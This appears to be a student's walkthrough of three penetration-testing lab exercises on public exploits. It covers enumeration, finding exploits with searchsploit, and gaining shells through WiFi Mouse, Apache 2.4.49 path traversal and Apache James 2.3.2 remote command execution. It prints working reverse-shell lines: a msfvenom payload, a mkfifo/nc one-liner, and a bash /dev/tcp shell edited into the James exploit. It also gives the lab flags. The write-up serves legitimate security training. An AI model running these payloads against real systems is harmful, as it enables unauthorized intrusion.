
1. Start and exploit the _PublicExploits01_ machine.

```bash
# Enumerate
sudo nmap -p- 192.168.198.10
	PORT    STATE SERVICE
	135/tcp open  msrpc
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

smbclient -L 192.168.198.10                                 
	Password for [WORKGROUP\kali]: <entered none>

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        offsec          Disk      
        Users           Disk   

# Connect to SMB share
smbclient //192.168.198.10/offsec
	dir Desktop
		flag.txt                            A       38  Sat Mar 16 15:30:41 2024
	get Desktop/flag.txt
		NT_STATUS_ACCESS_DENIED opening remote file \Desktop\flag.txt
	dir Downloads/
		7z2200-x64.exe                      A  1569243  Tue Jun 21 17:56:35 2022
		ccsetup601.exe                      A 49618184  Tue Jun 21 17:54:25 2022
		ChromeSetup.exe                     A  1414600  Tue Jun 21 17:53:48 2022
		desktop.ini                       AHS      282  Mon Jun 20 21:07:23 2022
		Firefox Installer.exe               A   348616  Tue Jun 21 17:52:08 2022
		MouseServer.exe                     A  3150224  Tue Jun 21 17:55:48 2022
		ZoomBackground.png                  A  4269990  Thu Jun 23 03:03:57 2022
```

Researching the files, MouseServer.exe is part of WiFi Mouse application

```bash
# Search for exploits
searchsploit "wifi mouse"
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	WiFi Mouse 1.7.8.5 - Remote Code Execution                                 | windows/remote/49601.py
	WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                             | windows/remote/50972.py
	WiFi Mouse 1.8.3.2 - Remote Code Execution (RCE)                           | windows/remote/51072.py
	WiFiMouse 1.8.3.4 - Remote Code Execution (RCE)                            | windows/remote/51016.sh

# Copy to local folder
searchsploit -m 50972

# Inspect source code to determine safety and how it works

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o revshell.exe
# Host payload exe on http.server
# Open Listener tab
nc -nlvp 4444

# Run
python3 50972.py 192.168.198.10 192.168.45.171:80 revshell.exe
```

> Answer:  OS{b8eb34e322b040a22cab87dcbe1bd67e}



2. Start and exploit the _PublicExploits02_ machine.

```bash
# Enumerate
nmap -Pn 192.168.187.188 -n -v -p- --max-scan-delay=0
PORT   STATE SERVICE
	80/tcp open  http

nmap -sV 192.168.187.188 -p 80
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.49 ((Unix))

# Search for payload
searchsploit apache 2.4
	Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)   | multiple/webapps/50383.sh

# Download
searchsploit -m 50383.sh

# Review code
# Copy/ paste example from code & replace with own command.  (for some reason wasn't working when I typed the entire command out myself)
	# Ex from code:   PoC.sh targets.txt /bin/sh whoami

./50383.sh targets.txt /bin/sh "cat /home/offsec/flag.txt"

# OR use a reverse shell using pipes
./50383.sh targets.txt /bin/sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 4444 >/tmp/f"
```

> Answer:  OS{e0d3cae709f265bc848e57aa5c325fc8}



3. **Capstone Exercise**: An exploitable server is running services on several ports on the exercise VM, _PublicExploits03_. Treat this like a real box and start by identifying what services are running. There is a local user _student_ on this box with the password _lab_. Exploit the vulnerable service and SSH to the box to read _flag.txt_ located in _/home/challenge/_

```bash
# Enumerate
nmap -Pn -n -v -p- 192.168.187.52 --max-scan-delay=0
	PORT      STATE SERVICE
	22/tcp    open  ssh
	32822/tcp open  unknown
	32823/tcp open  unknown
	32824/tcp open  unknown
	32825/tcp open  unknown
	32826/tcp open  unknown

# Attempt to version
nmap -sV 192.168.187.52 -p 22,32822,32823,32824,32825,32826
	PORT      STATE  SERVICE     VERSION
	22/tcp    open   ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
	32822/tcp open   james-admin JAMES Remote Admin 2.3.2
	32823/tcp open   nntp        JAMES nntpd (posting ok)
	32824/tcp open  pop3    JAMES pop3d 2.3.2
	32825/tcp open  smtp    JAMES smtpd 2.3.2
	32826/tcp open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Service Info: Host: 8155ad2d5547; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Search for an exploit
searchsploit james 2.3.2
	--------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                             |  Path
	--------------------------------------------------------------------------- ---------------------------------
	Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (M | linux/remote/48130.rb
	Apache James Server 2.3.2 - Remote Command Execution                       | linux/remote/35513.py
	Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) | linux/remote/50347.py
	--------------------------------------------------------------------------- ---------------------------------

# Copy exploit
searchsploit -m 35513.py

# Review code & edit:
	# Lines 18 & 19:  Swap payload types and enter in bash reverse shell one-liner
	payload = 'bash -i >& /dev/tcp/192.168.45.214/443 0>&1' # to exploit on any user
	#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root

	# Lines 36 - 38:  Update James default Admin port
	print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,32822))     # <- HERE

	# Lines 50 - 52:  Update James default SMTP port
	print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,32825))     # <- HERE


# Run exploit
python2.7 35513.py 192.168.187.52

# SSH in w/ student:lab user using discovered secondary SSH port
ssh student@192.168.187.52 -p 32826

# In Listener tab
OS{d4951cff60e71ec96f1673fe7a5df95c}
```

> Answer:  OS{d4951cff60e71ec96f1673fe7a5df95c}